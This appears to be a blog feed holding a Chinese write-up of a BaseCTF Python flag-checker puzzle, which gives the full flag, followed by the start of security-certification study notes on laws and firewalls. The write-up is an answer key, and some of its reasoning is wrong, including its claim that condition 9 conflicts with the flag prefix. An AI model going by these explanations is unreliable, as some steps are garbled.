      <link href="/2024/08/16/basectf-ren-sheng-ku-duan-wo-yong-python-misc/"/>
      <url>/2024/08/16/basectf-ren-sheng-ku-duan-wo-yong-python-misc/</url>
      
        <content type="html"><![CDATA[<h1 id="BaseCTF-人生苦短-我用Python（Misc）"><a href="#BaseCTF-人生苦短-我用Python（Misc）" class="headerlink" title="BaseCTF 人生苦短 我用Python（Misc）"></a>BaseCTF 人生苦短 我用Python（Misc）</h1><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">abort</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'You failed test %d. Try again!'</span> % <span class="built_in">id</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'Hello, Python!'</span>)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">'Enter your flag: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">38</span>:</span><br><span class="line">    abort(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> flag.startswith(<span class="string">'BaseCTF{'</span>):</span><br><span class="line">    abort(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag.find(<span class="string">'Mp'</span>) != <span class="number">10</span>:</span><br><span class="line">    abort(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[-<span class="number">3</span>:] * <span class="number">8</span> != <span class="string">'3x}3x}3x}3x}3x}3x}3x}3x}'</span>:</span><br><span class="line">    abort(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(flag[-<span class="number">1</span>]) != <span class="number">125</span>:</span><br><span class="line">    abort(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag.count(<span class="string">'_'</span>) // <span class="number">2</span> != <span class="number">2</span>:</span><br><span class="line">    abort(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">len</span>, flag.split(<span class="string">'_'</span>))) != [<span class="number">14</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>]:</span><br><span class="line">    abort(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">12</span>:<span class="number">32</span>:<span class="number">4</span>] != <span class="string">'lsT_n'</span>:</span><br><span class="line">    abort(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'😺'</span>.join([c.upper() <span class="keyword">for</span> c <span class="keyword">in</span> flag[:<span class="number">9</span>]]) != <span class="string">'B😺A😺S😺E😺C😺T😺F😺{😺S'</span>:</span><br><span class="line">    abort(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> flag[-<span class="number">11</span>].isnumeric() <span class="keyword">or</span> <span class="built_in">int</span>(flag[-<span class="number">11</span>]) ** <span class="number">5</span> != <span class="number">1024</span>:</span><br><span class="line">    abort(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> base64.b64encode(flag[-<span class="number">7</span>:-<span class="number">3</span>].encode()) != <span class="string">b'MG1QbA=='</span>:</span><br><span class="line">    abort(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[::-<span class="number">7</span>].encode().<span class="built_in">hex</span>() != <span class="string">'7d4372733173'</span>:</span><br><span class="line">    abort(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">set</span>(flag[<span class="number">12</span>::<span class="number">11</span>]) != {<span class="string">'l'</span>, <span class="string">'r'</span>}:</span><br><span class="line">    abort(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">21</span>:<span class="number">27</span>].encode() != <span class="built_in">bytes</span>([<span class="number">116</span>, <span class="number">51</span>, <span class="number">114</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">104</span>]):</span><br><span class="line">    abort(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> <span class="built_in">sum</span>(<span class="built_in">ord</span>(c) * <span class="number">2024_08_15</span> ** idx <span class="keyword">for</span> idx, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag[<span class="number">17</span>:<span class="number">20</span>])) != <span class="number">41378751114180610</span>:</span><br><span class="line">     abort(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>([flag[<span class="number">0</span>].isalpha(), flag[<span class="number">8</span>].islower(), flag[<span class="number">13</span>].isdigit()]):</span><br><span class="line">    abort(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'{whats} {up}'</span>.<span class="built_in">format</span>(whats=flag[<span class="number">13</span>], up=flag[<span class="number">15</span>]).replace(<span class="string">'3'</span>, <span class="string">'bro'</span>) != <span class="string">'bro 1'</span>:</span><br><span class="line">    abort(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> hashlib.sha1(flag.encode()).hexdigest() != <span class="string">'e40075055f34f88993f47efb3429bd0e44a7f479'</span>:</span><br><span class="line">    abort(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'🎉 You are right!'</span>)</span><br><span class="line"><span class="keyword">import</span> this</span><br></pre></td></tr></tbody></table></figure><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">abort</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'You failed test %d. Try again!'</span> % <span class="built_in">id</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><p>这个函数传入一个参数id，一旦传入参数，打印错误，根据函数调用情况来看，所以不能让if语句执行，所以if的条件要为否</p><h3 id="条件1"><a href="#条件1" class="headerlink" title="条件1"></a>条件1</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">38</span>:</span><br><span class="line">    abort(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><p>要求flag字符串长度为38，那么构造字符串38</p><h3 id="条件2"><a href="#条件2" class="headerlink" title="条件2"></a>条件2</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> flag.startswith(<span class="string">'BaseCTF{'</span>):</span><br><span class="line">    abort(<span class="number">2</span>)</span><br></pre></td></tr></tbody></table></figure><p>要求flag以’BaseCTF{‘开头，一定记住条件是反着的，如果开头不是这样，调用函数返回错误信息，所以这里一定要是这样，我们先用一种字符来占位</p><blockquote><p>BaseCTF{&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;}</p></blockquote><h3 id="条件3"><a href="#条件3" class="headerlink" title="条件3"></a>条件3</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag.find(<span class="string">'Mp'</span>) != <span class="number">10</span>:</span><br><span class="line">    abort(<span class="number">3</span>)</span><br></pre></td></tr></tbody></table></figure><p>要求在字符串flag中搜索子字符串’Mp’，并且其索引值为10，那么就是从索引值10开始为’Mp’</p><blockquote><p>BaseCTF{&amp;&amp;Mp&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;}</p></blockquote><h3 id="条件4"><a href="#条件4" class="headerlink" title="条件4"></a>条件4</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag[-<span class="number">3</span>:] * <span class="number">8</span> != <span class="string">'3x}3x}3x}3x}3x}3x}3x}3x}'</span>:</span><br><span class="line">    abort(<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure><p>要求从末尾倒着数3个字符×8之后是这个字符串，也就是最后三个字符是’3x}’</p><blockquote><p>BaseCTF{&amp;&amp;Mp&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;3x}</p></blockquote><h3 id="条件5"><a href="#条件5" class="headerlink" title="条件5"></a>条件5</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(flag[-<span class="number">1</span>]) != <span class="number">125</span>:</span><br><span class="line">    abort(<span class="number">5</span>)</span><br></pre></td></tr></tbody></table></figure><p><u><code>ord()</code> 函数用于获取单个字符的Unicode码点</u></p><p>flag[-1]获取最后一个字符</p><p>125 是字符 ‘}’ 的Unicode码点</p><p>所以验证了flag最后一个字符</p><h3 id="条件6"><a href="#条件6" class="headerlink" title="条件6"></a>条件6</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag.count(<span class="string">'_'</span>) // <span class="number">2</span> != <span class="number">2</span>:</span><br><span class="line">    abort(<span class="number">6</span>)</span><br></pre></td></tr></tbody></table></figure><p>要求flag中的’_’的数量整除2等于2，那么就是’_‘的数量是4，但是还不知道位置，先看后面</p><h3 id="条件7"><a href="#条件7" class="headerlink" title="条件7"></a>条件7</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">len</span>, flag.split(<span class="string">'_'</span>))) != [<span class="number">14</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>]:</span><br><span class="line">    abort(<span class="number">7</span>)</span><br></pre></td></tr></tbody></table></figure><p><code>flag.split('_')</code>：这个调用使用下划线（<code>_</code>）作为分隔符来分割字符串 flag</p><p><code>map</code> 函数接受两个参数，第一个是一个函数（在这个例子中是 <code>len</code> 函数），第二个是一个可迭代对象（在这个例子中是 <code>flag.split('_')</code> 返回的列表）</p><p><code>map</code> 函数会对可迭代对象中的每个元素应用第一个参数指定的函数，并返回一个迭代器，该迭代器包含应用函数后的结果，也就是<code>map(len, ...)</code> 会计算 <code>flag.split('_')</code> 返回的每个子字符串的长度，并返回一个包含这些长度的迭代器。</p><p>所以，相当于’_‘把整个flag分成了五段，且每段的数量就是列表中的数</p><blockquote><p>BaseCTF{&amp;&amp;Mp&amp;&amp;_&amp;&amp;_&amp;&amp;&amp;&amp;&amp;&amp;_&amp;&amp;&amp;&amp;_&amp;&amp;&amp;&amp;&amp;3x}</p></blockquote><h3 id="条件8"><a href="#条件8" class="headerlink" title="条件8"></a>条件8</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag[<span class="number">12</span>:<span class="number">32</span>:<span class="number">4</span>] != <span class="string">'lsT_n'</span>:</span><br><span class="line">    abort(<span class="number">8</span>)</span><br></pre></td></tr></tbody></table></figure><p>这是一个切片，从索引值12开始到32（不包括）为止，步进为4</p><blockquote><p>BaseCTF{&amp;&amp;Mpl&amp;_&amp;s_&amp;&amp;T&amp;&amp;&amp;_&amp;&amp;&amp;n_&amp;&amp;&amp;&amp;&amp;3x}</p></blockquote><h3 id="条件9"><a href="#条件9" class="headerlink" title="条件9"></a>条件9</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">'😺'</span>.join([c.upper() <span class="keyword">for</span> c <span class="keyword">in</span> flag[:<span class="number">9</span>]]) != <span class="string">'B😺A😺S😺E😺C😺T😺F😺{😺S'</span>:</span><br><span class="line">    abort(<span class="number">9</span>)</span><br></pre></td></tr></tbody></table></figure><p><strong>列表推导式 <code>[c.upper() for c in flag[:9]]</code></strong></p><ul><li>这个列表推导式遍历 <code>flag[:9]</code> 中的每个字符 <code>c</code>，并将它们转换为大写（<code>c.upper()</code>）。</li></ul><p>**<code>'😺'.join(...)</code>**：</p><ul><li>这个方法尝试将列表推导式的结果（即一系列大写字符）使用 ‘😺’ 作为分隔符连接起来，形成一个新的字符串。</li></ul><p>之前的所有过程都可以在pycharm上运行，但是这一步阻断了，之后的操作都不能再显示结果了，因为一旦你做了这一步，就违背了之前的以BaseCTF开头的条件，不做这一步，将会一直返回错误信息，所以这一条件没什么用，不用照着做</p><h3 id="条件10"><a href="#条件10" class="headerlink" title="条件10"></a>条件10</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> flag[-<span class="number">11</span>].isnumeric() <span class="keyword">or</span> <span class="built_in">int</span>(flag[-<span class="number">11</span>]) ** <span class="number">5</span> != <span class="number">1024</span>:</span><br><span class="line">    abort(<span class="number">10</span>)</span><br></pre></td></tr></tbody></table></figure><p><code>.isnumeric()</code>：这是一个字符串方法，用于检查字符串中的所有字符是否都是数字字符</p><p>条件要求倒数第11个字符是否为数字，或者将其转换为整数的5次方是否为1024，or是任意满足就是true，所以让倒数第11位是数字且5次方为1024，所以为4</p><blockquote><p>BaseCTF{&amp;&amp;Mpl&amp;_&amp;s_&amp;&amp;T&amp;&amp;&amp;_&amp;&amp;4n_&amp;&amp;&amp;&amp;&amp;3x}</p></blockquote><h3 id="条件11"><a href="#条件11" class="headerlink" title="条件11"></a>条件11</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> base64.b64encode(flag[-<span class="number">7</span>:-<span class="number">3</span>].encode()) != <span class="string">b'MG1QbA=='</span>:</span><br><span class="line">    abort(<span class="number">11</span>)</span><br></pre></td></tr></tbody></table></figure><p>flag[-7:-3]：从倒数第7个字符到倒数第4个字符（不包括）切片</p><p><code>.encode()</code>：这个方法将字符串（子串）编码成字节串（bytes）</p><p><code>base64.b64encode(...)</code>：这是Python标准库中<code>base64</code>模块的一个函数，用于将字节串数据编码成Base64格式的字节串</p><p>所以这个’MG1QbA==’为Base64编码得来，那么直接解码，得到’0mPl’，将他放入flag中</p><blockquote><p>BaseCTF{&amp;&amp;Mpl&amp;_&amp;s_&amp;&amp;T&amp;&amp;&amp;_&amp;&amp;4n_&amp;0mPl3x}</p></blockquote><h3 id="条件12"><a href="#条件12" class="headerlink" title="条件12"></a>条件12</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag[::-<span class="number">7</span>].encode().<span class="built_in">hex</span>() != <span class="string">'7d4372733173'</span>:</span><br><span class="line">    abort(<span class="number">12</span>)</span><br></pre></td></tr></tbody></table></figure><p><code>.encode()</code>：将字符串编码成字节串。</p><p><code>.hex()</code>：这是字节串的一个方法，它将字节串中的每个字节转换为其16进制表示形式，并返回一个字符串。</p><p>从末尾以步进为7倒着取数，然后将其转换为16进制</p><p>所以将字符串从16进制转换为字符串就可以，网上有专门的转换工具，转换出来为’}Crs1s’，放入flag</p><blockquote><p>BaseCTF{&amp;1Mpl&amp;_&amp;s_&amp;&amp;T&amp;&amp;r_&amp;&amp;4n_C0mPI3x}</p></blockquote><h3 id="条件13"><a href="#条件13" class="headerlink" title="条件13"></a>条件13</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">set</span>(flag[<span class="number">12</span>::<span class="number">11</span>]) != {<span class="string">'l'</span>, <span class="string">'r'</span>}:</span><br><span class="line">    abort(<span class="number">13</span>)</span><br></pre></td></tr></tbody></table></figure><p><code>set()</code>：将切片转换成一个集合（set）</p><p>从索引值为12的位置开始，步进11，设置值为’l’和’r’</p><p>发现这些值都已经设置过了，所以当验证吧</p><blockquote><p>BaseCTF{&amp;1Mpl&amp;_&amp;s_&amp;&amp;T&amp;&amp;r_&amp;&amp;4n_C0mPl3x}</p></blockquote><h3 id="条件14"><a href="#条件14" class="headerlink" title="条件14"></a>条件14</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag[<span class="number">21</span>:<span class="number">27</span>].encode() != <span class="built_in">bytes</span>([<span class="number">116</span>, <span class="number">51</span>, <span class="number">114</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">104</span>]):</span><br><span class="line">    abort(<span class="number">14</span>)</span><br></pre></td></tr></tbody></table></figure><p>从索引值21到27（不包括），放入ASCII值为这些的字符，为’t3r_Th’</p><blockquote><p> BaseCTF{&amp;1Mpl&amp;_&amp;s_&amp;&amp;Tt3r_Th4n_C0mPl3x}</p></blockquote><h3 id="条件15"><a href="#条件15" class="headerlink" title="条件15"></a>条件15</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">sum</span>(<span class="built_in">ord</span>(c) * <span class="number">2024_08_15</span> ** idx <span class="keyword">for</span> idx, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag[<span class="number">17</span>:<span class="number">20</span>])) != <span class="number">41378751114180610</span>:</span><br><span class="line">    abort(<span class="number">15</span>)</span><br></pre></td></tr></tbody></table></figure><p>flag[17:20]：切片，索引值17-20（不包括）</p><p><code>enumerate(...)</code>：为这三个字符生成索引（0, 1, 2）</p><p><code>ord(c)</code>：获取字符<code>c</code>的Unicode值。</p><p><code>2024_08_15 ** idx</code>：计算<code>2024_08_15</code>的<code>idx</code>次幂。</p><p><code>sum(...)</code>：把所有计算结果相加。</p><p>索引为17的字符为’_’，并且他的ASCII值为95，18和19是不知道的，设为x和y</p><p>结合得出一个公式：</p><p><strong>95*20240815^0^+x*20240815^1^+y*20240815^2^=41378751114180610</strong></p><p>直接写一个代码来遍历出x和y的值，能确定的是他们的ASCII值在0-127之间</p><p>代码如下：</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">95</span>*<span class="number">20240815</span>**<span class="number">0</span>+x*<span class="number">20240815</span>**<span class="number">1</span>+y*<span class="number">20240815</span>**<span class="number">2</span>==<span class="number">41378751114180610</span>:</span><br><span class="line">            <span class="built_in">print</span>(x,y)</span><br><span class="line"><span class="comment">#解出x=66，y=101</span></span><br></pre></td></tr></tbody></table></figure><p>x和y对应的字符为B和e，填入flag</p><blockquote><p> BaseCTF{&amp;1Mpl&amp;_&amp;s_BeTt3r_Th4n_C0mPl3x}</p></blockquote><h3 id="条件16"><a href="#条件16" class="headerlink" title="条件16"></a>条件16</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>([flag[<span class="number">0</span>].isalpha(), flag[<span class="number">8</span>].islower(), flag[<span class="number">13</span>].isdigit()]):</span><br><span class="line">    abort(<span class="number">16</span>)</span><br></pre></td></tr></tbody></table></figure><p><code>.isalpha()</code>方法检查是否是字母</p><p><code>.islower()</code>方法本身会先检查字符是否是字母，然后才是否是小写</p><p><code>.isdigit()</code>方法检查是否是一个数字</p><p>检查对应索引位置是否满足条件</p><p>得到一个线索，索引位置8为小写字母，但是也不知道值，所以先往下看</p><h3 id="条件17"><a href="#条件17" class="headerlink" title="条件17"></a>条件17</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">'{whats} {up}'</span>.<span class="built_in">format</span>(whats=flag[<span class="number">13</span>], up=flag[<span class="number">15</span>]).replace(<span class="string">'3'</span>, <span class="string">'bro'</span>) != <span class="string">'bro 1'</span>:</span><br><span class="line">    abort(<span class="number">17</span>)</span><br></pre></td></tr></tbody></table></figure><p> <code>.format()</code> 方法对字符串 <code>'{whats} {up}'</code> 进行格式化。这里，<code>{whats}</code> 和 <code>{up}</code> 是占位符，它们将被 <code>format()</code> 方法中的关键字参数 <code>whats</code> 和 <code>up</code> 的值所替换。在这个例子中，<code>whats</code> 被替换为 <code>flag[13]</code> 的值，而 <code>up</code> 被替换为 <code>flag[15]</code> 的值</p><p>replace方法将’3’替换为’bro’输出结果，所以flag[13]=3，flag[15]=1</p><blockquote><p>BaseCTF{&amp;1Mpl3_1s_BeTt3r_Th4n_C0mPl3x}</p></blockquote><h3 id="条件18"><a href="#条件18" class="headerlink" title="条件18"></a>条件18</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> hashlib.sha1(flag.encode()).hexdigest() != <span class="string">'e40075055f34f88993f47efb3429bd0e44a7f479'</span>:</span><br><span class="line">    abort(<span class="number">18</span>)</span><br></pre></td></tr></tbody></table></figure><p><code>hashlib.sha1()</code>函数需要一个字节串作为输入，而不是普通的字符串</p><p><code>.hexdigest()</code>方法将计算出的哈希值（原本是一个字节串）转换为一个十六进制表示的字符串。</p><p>使用了Python的<code>hashlib</code>库来计算<code>flag</code>变量的SHA-1哈希值</p><p>现在就只差flag[8]没有计算出来</p><p>直接写一个代码</p><p>代码如下：</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">    flag=<span class="string">'BaseCTF{&amp;1Mpl3_1s_BeTt3r_Th4n_C0mPl3x}'</span></span><br><span class="line">    flag = flag.replace(<span class="string">'&amp;'</span>,<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">if</span> hashlib.sha1(flag.encode()).hexdigest() == <span class="string">'e40075055f34f88993f47efb3429bd0e44a7f479'</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(i))</span><br><span class="line">得到flag[<span class="number">8</span>]=s</span><br></pre></td></tr></tbody></table></figure><blockquote><p>BaseCTF{s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x}</p></blockquote><p>完结撒花！！</p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BaseCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深信服安全技术认证工程师学习笔记</title>
      <link href="/2024/08/14/shen-xin-fu-an-quan-ji-zhu-ren-zheng-gong-cheng-shi-xue-xi-bi-ji/"/>
      <url>/2024/08/14/shen-xin-fu-an-quan-ji-zhu-ren-zheng-gong-cheng-shi-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="深信服安全技术认证工程师学习笔记"><a href="#深信服安全技术认证工程师学习笔记" class="headerlink" title="深信服安全技术认证工程师学习笔记"></a>深信服安全技术认证工程师学习笔记</h1><h2 id="第一章-网络安全基础"><a href="#第一章-网络安全基础" class="headerlink" title="第一章 网络安全基础"></a>第一章 网络安全基础</h2><h4 id="1-1信息时代与信息安全"><a href="#1-1信息时代与信息安全" class="headerlink" title="1.1信息时代与信息安全"></a>1.1信息时代与信息安全</h4><ul><li><p>我国超级计算机-神威太湖之光、天河二号</p></li><li><p>《中华人民共和国网络安全法》2016年11月7日颁布，于2017年6月1日正式实行</p></li><li><p>《中华人民共和国密码法》2019年10月26日正式通过，2020年1月1日正式实施</p></li><li><p>2020年04月27日，国家网信办等十二部门联合印发《网络安全审查办法》</p></li><li><p>2021年6月10日《中华人民共和国数据安全法》发布，于2021年9月1日起施行。</p></li><li><p>2021年7月30日，国务院发布《关键信息基础设施安全保护条例》，于2021年9月1日开始施行。</p></li><li><p>2021年8月20日，《中华人民共和国个人信息保护法》，于2021年11月1日开始实施。</p></li></ul><h4 id="1-2网络空间安全学科浅谈"><a href="#1-2网络空间安全学科浅谈" class="headerlink" title="1.2网络空间安全学科浅谈"></a>1.2网络空间安全学科浅谈</h4><h2 id="第二章-操作系统基础"><a href="#第二章-操作系统基础" class="headerlink" title="第二章 操作系统基础"></a>第二章 操作系统基础</h2><h2 id="第三章-网络运维"><a href="#第三章-网络运维" class="headerlink" title="第三章 网络运维"></a>第三章 网络运维</h2><h3 id="第一部分-计算机网络原理"><a href="#第一部分-计算机网络原理" class="headerlink" title="第一部分 计算机网络原理"></a>第一部分 计算机网络原理</h3><h3 id="第二部分-路由与交换"><a href="#第二部分-路由与交换" class="headerlink" title="第二部分 路由与交换"></a>第二部分 路由与交换</h3><h2 id="第四章-网络安全产品运维"><a href="#第四章-网络安全产品运维" class="headerlink" title="第四章 网络安全产品运维"></a>第四章 网络安全产品运维</h2><h3 id="第一部分-下一代防火墙基础原理与运维"><a href="#第一部分-下一代防火墙基础原理与运维" class="headerlink" title="第一部分 下一代防火墙基础原理与运维"></a>第一部分 下一代防火墙基础原理与运维</h3><h4 id="4-1-1下一代防火墙概述"><a href="#4-1-1下一代防火墙概述" class="headerlink" title="4.1.1下一代防火墙概述"></a>4.1.1下一代防火墙概述</h4><ol><li>防火墙分类</li></ol><p><img src="https://pic.imgdb.cn/item/66bc90add9c307b7e9c2c1ea.png"></p><ol start="2"><li><p>防火墙功能</p><ul><li>访问控制（ACL）</li><li>地址转换（NAT）</li><li>网络环境支持</li><li>带宽管理功能</li><li>入侵检测和攻击防御</li><li>用户认证</li><li>高可用性</li></ul></li><li><p>防火墙安全策略</p></li></ol><p><img src="https://pic.imgdb.cn/item/66bc918ed9c307b7e9c37e92.png"></p><ol start="4"><li>防火墙安全策略原理</li></ol><p><img src="https://pic.imgdb.cn/item/66bc9200d9c307b7e9c3d55d.png"></p><ol start="5"><li>安全策略分类</li></ol><ul><li>域间安全策略（不同域之间）</li><li>域内安全策略（相同域内）</li><li>接口包过滤</li></ul><ol 